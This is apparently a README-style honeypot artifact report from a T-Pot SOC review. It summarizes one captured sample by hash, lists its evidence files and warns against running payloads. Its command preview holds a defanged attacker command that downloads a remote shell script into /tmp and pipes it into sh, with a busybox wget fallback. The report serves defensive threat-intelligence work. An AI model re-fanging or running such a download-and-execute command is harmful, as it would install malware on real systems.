# 51fee2d6a5594f4d13ce9f6701fd35128c32a1963a114f1c82ab4b452a418fa7

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `51fee2d6a5594f4d13ce9f6701fd35128c32a1963a114f1c82ab4b452a418fa7` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
{"cmd":"`cd /tmp;wget hxxp://91[.]92[.]40[.]XXX/wget.sh -O-|sh -s 9router;busybox wget hxxp://91[.]92[.]40[.]XXX/wget.sh -O-|sh -s 9
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
